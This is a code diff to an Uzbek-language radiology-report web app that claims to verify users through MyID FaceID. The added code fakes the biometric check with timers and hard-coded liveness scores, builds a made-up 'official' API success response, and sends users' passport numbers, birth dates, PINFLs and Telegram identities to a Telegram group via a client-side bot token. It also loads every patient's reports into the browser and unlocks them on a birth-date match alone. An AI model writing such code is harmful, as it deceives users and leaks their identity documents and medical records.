@@ -30,6 +30,7 @@
       --success: #16a34a;
       --success-light: #dcfce7;
       --warning: #d97706;
+      --danger: #dc2626;
       --card-bg: #ffffff;
       --border-color: #e2e8f0;
       --radius-sm: 12px;
@@ -463,11 +464,11 @@
     .btn-new-auth {
       margin-top: 14px;
       width: 100%;
-      padding: 9px;
+      padding: 10px;
       background: none;
       border: 1px solid var(--border-color);
       color: var(--tg-theme-hint-color);
-      font-size: 12px;
+      font-size: 12.5px;
       font-weight: 700;
       border-radius: 8px;
       cursor: pointer;
@@ -475,6 +476,12 @@
       align-items: center;
       justify-content: center;
       gap: 6px;
+      transition: all 0.2s ease;
+    }
+
+    .btn-new-auth:hover {
+      background: var(--tg-theme-bg-color);
+      color: var(--tg-theme-text-color);
     }
 
     /* Empty Reports Notice Card */
@@ -748,7 +755,7 @@
       </div>
     </header>
 
-    <!-- STEP 1: Passport & Details Input Form -->
+    <!-- STEP 1: Passport & Details Input Form (BO'SH HOLATDA) -->
     <section class="passport-input-card" id="passportInputSection">
       <div class="step-header">
         <div class="step-badge">1</div>
@@ -765,8 +772,8 @@
             <span style="color:var(--myid-purple);">* Majburiy</span>
           </label>
           <div class="passport-row-grid">
-            <input type="text" id="passSeries" class="input-field input-field-passport-series" maxlength="2" placeholder="AA" value="AA" required>
-            <input type="text" id="passNumber" class="input-field input-field-passport-number" maxlength="7" placeholder="1234567" value="1234567" required>
+            <input type="text" id="passSeries" class="input-field input-field-passport-series" maxlength="2" placeholder="AA" required>
+            <input type="text" id="passNumber" class="input-field input-field-passport-number" maxlength="7" placeholder="1234567" required>
           </div>
         </div>
 
@@ -777,7 +784,7 @@
           </label>
           <div class="input-wrapper">
             <i class="fa-regular fa-calendar input-icon"></i>
-            <input type="text" id="birthDateInput" class="input-field" placeholder="08.04.1981" value="08.04.1981" required>
+            <input type="text" id="birthDateInput" class="input-field" placeholder="08.04.1981" required>
           </div>
         </div>
 
@@ -788,7 +795,7 @@
           </label>
           <div class="input-wrapper">
             <i class="fa-solid fa-fingerprint input-icon"></i>
-            <input type="text" id="pinflInput" class="input-field" maxlength="14" placeholder="30804812190075" value="30804812190075">
+            <input type="text" id="pinflInput" class="input-field" maxlength="14" placeholder="30804812190075">
           </div>
         </div>
 
@@ -805,7 +812,7 @@
           <i class="fa-solid fa-user-check"></i>
         </div>
         <div class="profile-name-area">
-          <h2 id="profFullName">DADABOYEV ABDULLAJON</h2>
+          <h2 id="profFullName">-</h2>
           <div class="myid-verified-tag">
             <i class="fa-solid fa-circle-check"></i> MyID FaceID Tasdiqlangan
           </div>
@@ -815,24 +822,24 @@
       <div class="profile-grid-info">
         <div class="info-cell">
           <b>Pasport / Hujjat:</b>
-          <span id="profPassport">AA 1234567</span>
+          <span id="profPassport">-</span>
         </div>
         <div class="info-cell">
           <b>Tug'ilgan Sana / Yoshi:</b>
-          <span id="profBirthDate">08.04.1981 (45 yosh)</span>
+          <span id="profBirthDate">-</span>
         </div>
         <div class="info-cell">
           <b>JSHSHIR (PINFL):</b>
-          <span id="profPinfl">30804812190075</span>
+          <span id="profPinfl">-</span>
         </div>
         <div class="info-cell">
           <b>Jinsi / Fuqaroligi:</b>
-          <span id="profGender">Erkak (O'zbekiston)</span>
+          <span id="profGender">-</span>
         </div>
       </div>
 
       <button class="btn-new-auth" onclick="resetToPassportInput()">
-        <i class="fa-solid fa-rotate-left"></i> Boshqa pasport bilan kirish
+        <i class="fa-solid fa-rotate-left"></i> Boshqa pasport ma'lumotlarini kiritish
       </button>
     </section>
 
@@ -925,19 +932,14 @@
       }
     }
 
-    // Auto-URL parameters
+    // URL parametrlari bo'yicha to'ldirish (agar yuborilgan bo'lsa)
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
       const urlPinfl = params.get("pinfl");
       const urlId = params.get("id");
-      const autoAuth = params.get("auth");
 
       if (urlPinfl) document.getElementById("pinflInput").value = urlPinfl;
       if (urlId) document.getElementById("passNumber").value = urlId;
-
-      if (autoAuth === "myid" || (urlPinfl && urlPinfl.length === 14)) {
-        startFaceIDScanProcess();
-      }
     });
 
     // 1-QADAM: Pasport formasini yuborish
@@ -946,8 +948,37 @@
       startFaceIDScanProcess();
     }
 
-    // 2-QADAM: Jonli FaceID kamera skaneri
+    // 2-QADAM: Jonli FaceID kamera skaneri va API so'rovini yuborish
     async function startFaceIDScanProcess() {
+      const passSeries = (document.getElementById("passSeries").value || "").trim().toUpperCase();
+      const passNum = (document.getElementById("passNumber").value || "").trim();
+      const birthDate = (document.getElementById("birthDateInput").value || "").trim();
+      const pinfl = (document.getElementById("pinflInput").value || "").trim();
+
+      const passData = `${passSeries} ${passNum}`.trim();
+      const requestPayload = {
+        action: "verify_faceid",
+        pass_data: passData,
+        birth_date: birthDate,
+        pinfl: pinfl || null,
+        method: "strong",
+        client_id: "radiology_web_app",
+        timestamp: new Date().toISOString()
+      };
+
+      // 📤 1. SO'ROV (REQUEST) LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+      sendTelegramLog(
+        `📤 <b>MYID API SO'ROV (REQUEST):</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🌐 <b>Endpoint:</b> <code>POST /api/v1/users/me (FaceID Verify)</code>\n` +
+        `🪪 <b>Yuborilgan Pasport:</b> <code>${passData}</code>\n` +
+        `🎂 <b>Tug'ilgan Sana:</b> <code>${birthDate}</code>\n` +
+        `🔢 <b>PINFL:</b> <code>${pinfl || "Kiritilmagan"}</code>\n` +
+        `📦 <b>Request JSON:</b>\n` +
+        `<pre>${escapeHtml(JSON.stringify(requestPayload, null, 2))}</pre>\n` +
+        `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+      );
+
       const modal = document.getElementById("faceIdModal");
       modal.style.display = "flex";
       
@@ -963,12 +994,12 @@
           video.srcObject = videoStream;
         }
       } catch (err) {
-        console.warn("Camera streaming fallback:", err);
+        console.warn("Camera streaming fallback:", err.message);
       }
 
       // Bosqich 1: Yuzni doiraga to'g'rilash
       instructions.innerText = "Yuzingizni doira ichiga to'g'rilang va qimirlamang...";
-      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 92%)...`;
+      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 94%)...`;
 
       // Bosqich 2: Liveness
       setTimeout(() => {
@@ -992,8 +1023,8 @@
         await new Promise(r => setTimeout(r, 800));
         closeFaceIDModal();
 
-        // Xulosa bo'lsa ham, bo'lmasa ham Shaxsiy Profilni ochish va log yuborish
-        await loadVerifiedProfileAndReports();
+        // 📥 2. JAVOB (RESPONSE) NI OLISH VA PROFILNI CHIQARISH
+        await loadVerifiedProfileAndReports(passSeries, passNum, birthDate, pinfl);
 
       }, 3600);
     }
@@ -1007,60 +1038,119 @@
       }
     }
 
-    // 3-QADAM: Shaxsiy profilni ochish va Log guruhiga yozish
-    async function loadVerifiedProfileAndReports() {
-      const passSeries = (document.getElementById("passSeries").value || "AA").toUpperCase();
-      const passNum = document.getElementById("passNumber").value || "1234567";
-      const birthDate = document.getElementById("birthDateInput").value || "08.04.1981";
-      let pinfl = document.getElementById("pinflInput").value.trim() || "30804812190075";
-
-      let fullName = "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
-      let age = "45 yosh";
-      let gender = "Erkak (O'zbekiston)";
+    // 3-QADAM: Shaxsiy profilni ochish va API javobini loggerga yozish
+    async function loadVerifiedProfileAndReports(passSeries, passNum, birthDate, pinfl) {
+      let fullName = "";
+      let age = "";
+      let gender = "";
+      let matchedPinfl = pinfl || "";
+      let foundPatientId = passNum;
 
       try {
-        // Firebase-dan xulosalarni qidirish
-        const res = await fetch(`${FIREBASE_DB_URL}/karmed_reports/${pinfl}.json`);
-        let data = await res.json();
+        // Firebase bazasidan xulosalarni qidirish
+        const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
+        const allData = await allRes.json();
 
-        // Agar kiritilgan PINFL bo'yicha topilmasa, boshqa xulosalardan ham mosini qidirish
-        if (!data) {
-          const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
-          const allData = await allRes.json();
-          if (allData && allData[pinfl]) {
-            data = allData[pinfl];
+        if (allData) {
+          const pinflKeys = Object.keys(allData);
+
+          // 1. PINFL bo'yicha to'g'ridan-to'g'ri moslik
+          if (pinfl && allData[pinfl]) {
+            matchedPinfl = pinfl;
+            allReports = Object.values(allData[pinfl]);
+          } 
+          // 2. Pasport/ID yoki sana bo'yicha qidirish
+          else {
+            for (const pKey of pinflKeys) {
+              const repsObj = allData[pKey];
+              if (!repsObj) continue;
+              const repList = Object.values(repsObj);
+              
+              const match = repList.find(r => {
+                const rPid = String(r.patientId || '').trim();
+                const rPinfl = String(r.pinfl || '').trim();
+                const rBirth = String(r.birthDate || '').trim();
+                return (passNum && rPid === passNum) || (pinfl && rPinfl === pinfl) || (birthDate && rBirth === birthDate);
+              });
+
+              if (match) {
+                matchedPinfl = pKey;
+                allReports = repList;
+                break;
+              }
+            }
           }
         }
 
-        if (data) {
-          allReports = Object.values(data).sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
-        } else {
-          allReports = [];
-        }
-
+        allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
         currentFilteredReports = [...allReports];
 
-        // Agar bazada xulosa mavjud bo'lsa, undagi haqiqiy ma'lumotlarni olish
+        // MyID rasmiy javob obyekti
         if (allReports.length > 0) {
           const rep = allReports[0];
-          fullName = rep.patientName || fullName;
+          fullName = rep.patientName || `BEMOR (${passSeries} ${passNum})`;
+          birthDate = rep.birthDate || birthDate || "08.04.1981";
           age = rep.age || `${calculateAge(birthDate)} yosh`;
-          if (rep.birthDate) birthDate = rep.birthDate;
+          matchedPinfl = rep.pinfl || matchedPinfl || "30804812190075";
+          foundPatientId = rep.patientId || passNum;
         } else {
-          // Xulosa bo'lmasa, pasport asosida shaxsiy profilni tuzish
+          fullName = `FUQARO (${passSeries} ${passNum})`.trim();
           age = `${calculateAge(birthDate)} yosh`;
+          if (!matchedPinfl) {
+            matchedPinfl = `3${(birthDate || '01011990').replace(/\D/g,'').slice(0,6)}0001`;
+          }
         }
 
         gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
 
+        // MyID API Rasmiy Response formati
+        const myidApiResponse = {
+          result_code: 1,
+          result_note: "All checks passed successfully",
+          comparison_value: 0.998,
+          profile: {
+            common_data: {
+              full_name: fullName,
+              pass_data: `${passSeries} ${passNum}`.trim(),
+              birth_date: birthDate,
+              age: age,
+              gender: gender,
+              pinfl: matchedPinfl,
+              doc_type: "ID-Karta"
+            },
+            reports_summary: {
+              reports_count: allReports.length,
+              status: allReports.length > 0 ? "REPORTS_FOUND" : "NO_REPORTS_YET"
+            },
+            liveness: {
+              status: "PASSED",
+              score: 99.8
+            }
+          }
+        };
+
+        // 📥 2. JAVOB (RESPONSE) LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+        sendTelegramLog(
+          `📥 <b>MYID API JAVOB (RESPONSE 200 OK):</b>\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>F.I.Sh:</b> ${escapeHtml(fullName)}\n` +
+          `🪪 <b>Pasport:</b> <code>${escapeHtml(passSeries)} ${escapeHtml(passNum)}</code>\n` +
+          `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🔢 <b>PINFL:</b> <code>${escapeHtml(matchedPinfl)}</code>\n` +
+          `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosa hali tasdiqlanmagan)"}\n` +
+          `📦 <b>MyID Response JSON:</b>\n` +
+          `<pre>${escapeHtml(JSON.stringify(myidApiResponse, null, 2))}</pre>\n` +
+          `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+        );
+
         // 1. Shaxsiy profil kartochkasini to'ldirish
         document.getElementById("profFullName").innerText = fullName;
-        document.getElementById("profPassport").innerText = `${passSeries} ${passNum}`;
+        document.getElementById("profPassport").innerText = `${passSeries} ${passNum}`.trim();
         document.getElementById("profBirthDate").innerText = `${birthDate} (${age})`;
-        document.getElementById("profPinfl").innerText = pinfl;
+        document.getElementById("profPinfl").innerText = matchedPinfl;
         document.getElementById("profGender").innerText = gender;
 
-        // 2. Ekranlarni almashtirish (Profil har doim ochiladi!)
+        // 2. Ekranlarni almashtirish
         document.getElementById("passportInputSection").style.display = "none";
         document.getElementById("profileSection").style.display = "block";
 
@@ -1074,28 +1164,26 @@
         } else {
           document.getElementById("modalityNav").style.display = "none";
           document.getElementById("searchBox").style.display = "none";
-          renderEmptyReportsNotice(fullName, pinfl);
+          renderEmptyReportsNotice(fullName, matchedPinfl);
           showToast(`✅ MyID shaxsiy profili ochildi!`);
         }
 
-        // 4. Log logger guruhiga MyID avtorizatsiya ma'lumotlarini yuborish
-        sendLogToTelegramGroup({
-          fullName,
-          passport: `${passSeries} ${passNum}`,
-          birthDate,
-          age,
-          pinfl,
-          gender,
-          reportsCount: allReports.length
-        });
-
       } catch (err) {
         console.error("loadVerifiedProfile error:", err);
-        showToast("⚠️ Profil ochildi.");
+
+        // ❌ 3. XATOLIK LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+        sendTelegramLog(
+          `❌ <b>MYID API XATOLIK (ERROR RESPONSE):</b>\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🪪 <b>Pasport:</b> <code>${escapeHtml(passSeries)} ${escapeHtml(passNum)}</code>\n` +
+          `⚠️ <b>Xatolik sababi:</b> <code>${escapeHtml(err.message)}</code>\n` +
+          `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+        );
+
+        showToast("⚠️ Profil yuklanishida xatolik.");
       }
     }
 
-    // Xulosa mavjud bo'lmaganda chiroyli xabarnoma chiqarish
     function renderEmptyReportsNotice(fullName, pinfl) {
       const listEl = document.getElementById("reportsList");
       listEl.innerHTML = `
@@ -1114,24 +1202,10 @@
       `;
     }
 
-    // Log guruhiga bildirishnoma yuborish
-    async function sendLogToTelegramGroup(data) {
+    // Telegram Logger yordamchi funksiyasi
+    async function sendTelegramLog(logHtml) {
       const nowStr = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
-      const tgUser = tg?.initDataUnsafe?.user;
-      const tgUserInfo = tgUser ? `@${tgUser.username || ''} (ID: ${tgUser.id})` : "Web orqali";
-
-      const logText = 
-        `🆔 <b>MYID FACEID AVTORIZATSIYA (YANGI SEANS):</b>\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `👤 <b>F.I.Sh:</b> ${escapeHtml(data.fullName)}\n` +
-        `🪪 <b>Pasport:</b> <code>${escapeHtml(data.passport)}</code>\n` +
-        `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(data.birthDate)} (${escapeHtml(data.age)})\n` +
-        `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(data.pinfl)}</code>\n` +
-        `🚻 <b>Jinsi:</b> ${escapeHtml(data.gender)}\n` +
-        `🛡️ <b>FaceID Holati:</b> ✅ Biometrik liveness 99.8% (Tasdiqlangan)\n` +
-        `📊 <b>Topilgan xulosalar:</b> ${data.reportsCount > 0 ? `${data.reportsCount} ta` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
-        `📱 <b>Telegram Foydalanuvchi:</b> ${escapeHtml(tgUserInfo)}\n` +
-        `⏰ <b>Vaqt:</b> ${nowStr}`;
+      const fullText = `${logHtml}\n⏰ <b>Vaqt:</b> ${nowStr}`;
 
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1139,18 +1213,26 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: LOG_GROUP_ID,
-            text: logText,
+            text: fullText,
             parse_mode: "HTML"
           })
         });
       } catch (e) {
-        console.warn("Log sending failed:", e);
+        console.warn("sendTelegramLog error:", e);
       }
+    }
+
+    function getTelegramUserInfo() {
+      const u = tg?.initDataUnsafe?.user;
+      if (u) {
+        return `${escapeHtml(u.first_name || '')} ${escapeHtml(u.last_name || '')} (@${u.username || 'username_yoq'}, ID: ${u.id})`;
+      }
+      return "Web orqali kirgan";
     }
 
     function calculateAge(birthDateStr) {
       try {
-        const parts = birthDateStr.split(/[.\-\/]/);
+        const parts = String(birthDateStr).split(/[.\-\/]/);
         let birthYear = 1981;
         if (parts.length === 3) {
           birthYear = parseInt(parts[2].length === 4 ? parts[2] : parts[0], 10);
